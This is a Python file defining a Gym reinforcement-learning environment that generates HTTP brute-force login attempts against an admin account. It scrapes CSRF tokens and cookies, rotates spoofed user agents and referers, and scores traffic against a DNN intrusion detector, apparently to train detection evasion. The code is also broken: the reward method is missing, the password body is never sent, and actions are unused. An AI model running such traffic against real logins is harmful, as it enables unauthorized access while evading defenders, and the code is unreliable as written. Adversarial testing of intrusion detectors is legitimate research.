import gym, socket, pickle, os, random, string
import numpy as np
import os.path as osp

from gym import spaces
from threading import Thread
from pcap_proc import read_iface,  calculate_features
from time import time, sleep
from train_dnn import create_model as dnn_model

class DeEnv(gym.Env):

    metadata = {'render.modes': ['human']}

    def __init__(self, iface, src_port, server, url, attack, obs_len, flow_std_file='data/flows/stats.pkl', model_dir='models', model_type='dnn'):

        super(DeEnv, self).__init__()

        self.obs_len = obs_len
        self.n_obs_features = 12
        self.n_actions = 5
        self.port = src_port
        self.remote = server
        self.pkt_list = []
        self.monitor_thr = Thread(target=read_iface, args=(self.pkt_list, iface, src_port, server[0]), daemon=True)
        self.monitor_thr.start()
        self.t_start = time()
        with open(flow_std_file, 'rb') as f:
            stats = pickle.load(f)
        self.target_features = np.where(stats[4] > 0)[0][:-1] # the last feature is the label, we do not need it here
        self.xmin = stats[1]
        self.xmax = stats[2]
        self.target_model = self._load_model(model_dir, model_type)
        self.url = url
        self.attack = attack

        # actions: break, delay, pad, packet

        self.action_space = spaces.Box(low=-1, high=1, shape=(self.n_actions,))

        # observation features: time, frame length, header size, window, 8 tcp flags

        self.observation_space = spaces.Box(low=0, high=np.inf, shape=(self.obs_len, self.n_obs_features))

    def step(self, action):

        if self.attack == 'bruteforce':
            pkt = self._generate_bruteforce_packet()
        self.sckt.sendall(pkt.encode('utf-8'))
        self._process_reply()

        # observation

        obs = self._get_obs()

        # reward

        reward = self._calculate_reward()

        # done

        y = self._classify()
        if y == 1:
            done = True
        else:
            done = False

        print(y, reward, done)

        return obs, reward, done, {}

    def reset(self):
        self.pkt_list.clear()
        self._generate_user_agent()
        self._generate_referer()
        self.user_token = None
        self.cookie = None
        self.t_start = time()
        self.sckt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sckt.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sckt.bind(('', self.port))
        self.sckt.connect(self.remote)
        while len(self.pkt_list) < 3:
            sleep(0.001)
        obs = self._get_obs()
        return obs

    def render(self, mode='human', close=False):
        pass

    def _get_obs(self):
        obs = np.zeros((self.obs_len, self.n_obs_features))
        for i,p in enumerate(self.pkt_list[::-1]):
            obs[-i-1, 0] = p[0] - self.t_start
            obs[-i-1, 1] = p[6]
            obs[-i-1, 2] = p[7]
            obs[-i-1, 3] = p[9]
            obs[-i-1, 4] = str(p[8]).count('0')
            obs[-i-1, 5] = str(p[8]).count('1')
            obs[-i-1, 6] = str(p[8]).count('2')
            obs[-i-1, 7] = str(p[8]).count('3')
            obs[-i-1, 8] = str(p[8]).count('4')
            obs[-i-1, 9] = str(p[8]).count('5')
            obs[-i-1, 10] = str(p[8]).count('6')
            obs[-i-1, 11] = str(p[8]).count('7')
            if i >= self.obs_len - 1:
                break
        return obs

    def _generate_user_agent(self):
        user_agents = [
            'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
            'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
            'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
            'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
            'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
            'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
            'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
            'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51'
        ]
        self.user_agent = np.random.choice(user_agents)

    def _generate_referer(self):
        referers = [
            'http://www.google.com/?q=',
            'http://www.usatoday.com/search/results?q=',
            'http://engadget.search.aol.com/search?q='
        ]
        self.referer = np.random.choice(referers)

    def _generate_bruteforce_packet(self):
        if self.cookie == None or self.user_token == None:
            packet_as_a_list = [
                'GET {0} HTTP/1.1'.format(self.url),
                'Host: {0}'.format(self.remote[0]),
                'User-Agent: {0}'.format(self.user_agent),
                'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language: en-US,en;q=0.5',
                'Accept-Encoding: gzip, deflate',
                'Referer: {0}'.format(self.referer)
            ]
        else:
            password = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
            content = '\r\n\r\nusername=admin&password={0}&Login=Login&user_token={1}'.format(password, self.user_token)
            packet_as_a_list = [
                'POST {0} HTTP/1.1'.format(self.url),
                'Host: {0}'.format(self.remote[0]),
                'User-Agent: {0}'.format(self.user_agent),
                'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language: en-US,en;q=0.5',
                'Accept-Encoding: gzip, deflate',
                'Referer: {0}'.format(self.referer),
                'Cookie: {0}'.format(self.cookie)
            ]
        return '\r\n'.join(packet_as_a_list)


    def _process_reply(self):
        reply = self.sckt.recv(4096).decode('utf-8')
        lines = reply.split('\r\n')
        if self.user_token is None:
            for line in lines:
                if 'user_token' in line:
                    spl = line.split('value=')
                    self.user_token = spl[1].split('/>')[0][1:-2]
                    break
        if self.cookie is None:
            cookie_list = []
            spl = reply.split('Set-Cookie: ')
            for item in spl[1:]:
                cookie_value = item.split(';')[0]
                if cookie_value not in cookie_list:
                    cookie_list.append(cookie_value)
            self.cookie = ';'.join(cookie_list)

    def _load_model(self, model_dir, prefix):
        model_score = 0
        model_name = ''
        ckpt_path = ''
        for sd in os.listdir(model_dir):
            subdir = osp.join(model_dir, sd)
            if osp.isdir(subdir) and sd.startswith(prefix):
                try:
                    with open(osp.join(subdir, 'metrics.txt'), 'r') as f:
                        line = f.readline()
                        spl = line.split(',')
                        score = float(spl[-1])
                        if score > model_score:
                            model_score = score
                            model_name = sd
                            ckpt_path = osp.join(subdir, 'ckpt')
                            print(model_name, model_score, ckpt_path)
                except Exception as e:
                    print(e)
        if model_name.startswith('dnn'):
            params = [int(item) for item in model_name.split('_')[1:]]
            model = dnn_model(len(self.target_features), *params)
            model.summary()
            model.load_weights(ckpt_path)
        return model

    def _classify(self):
        flow_ids = ['-{0}-{1}-{2}-6'.format(self.port, self.remote[0], self.remote[1])]
        pkt_lists = [[[pkt[0], pkt[6], pkt[7], pkt[9]] for pkt in self.pkt_list]]
        pkt_flags = [[str(pkt[8]) for pkt in self.pkt_list]]
        pkt_directions = [[1 if pkt[2] == self.port else -1 for pkt in self.pkt_list]]
        v = np.array(calculate_features(flow_ids, pkt_lists, pkt_flags, pkt_directions))
        x = (np.array(v[:, self.target_features]) - self.xmin[self.target_features]) / (self.xmax[self.target_features] - self.xmin[self.target_features])
        return np.argmax(self.target_model.predict(x))

